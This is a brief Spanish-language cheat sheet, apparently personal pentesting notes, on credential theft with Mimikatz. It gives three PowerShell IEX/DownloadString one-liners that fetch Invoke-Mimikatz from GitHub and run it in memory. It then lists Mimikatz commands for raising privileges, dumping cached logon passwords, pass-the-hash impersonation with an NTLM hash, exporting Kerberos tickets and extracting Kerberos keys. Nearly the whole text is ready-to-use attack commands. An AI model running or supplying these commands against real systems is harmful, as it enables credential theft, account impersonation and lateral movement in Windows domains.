### Opciones de carga (IEX)

**Opción 1**

PowerShell

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1')
```

**Opción 2**

PowerShell

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/b1aba6be193c1d34c62272124c8ef7084f7e552c/Invoke-Mimikatz.ps1')
```

**Opción 3**

PowerShell

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1') 
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1')
```

### Comandos de ejecución

Una vez abierto y ejecutado:

PowerShell

```
Invoke-Mimikatz -command [COMANDO QUE QUEREMOS EJECUTAR DE MIMIKATZ]
```

Comandos:
`privilege::debug`
Este comando nos sube los privilegios para poder usar los siguientes

`Sekurlsa::logonpasswords`
Este comando nos muestra las contraseñas guardadas en cache

`sekurlsa::pth /user:[USERNAME_SUPLANTAR] /rc4:[HASH_NTLM] /domain:[DOMINIO] /run:cmd.exe` 
Este comando nos da una consola con la sesión del suplantado #PassTheHash 


`sekurlsa::tickets`
Este comando nos muestra los tickets que hay en la máquina si queremos que los guarde en un fichero todos los tickets podemos añadir "/export" en el comando #PassTheHash #OverPassTheHash 
(Los tickets con "$" son de cuenta máquina que necesitan uno para interactuar con el AD y los otros con el "@" son de usuario)

`sekurlsa::ekeys`
Para sacar Hashes de Kerberos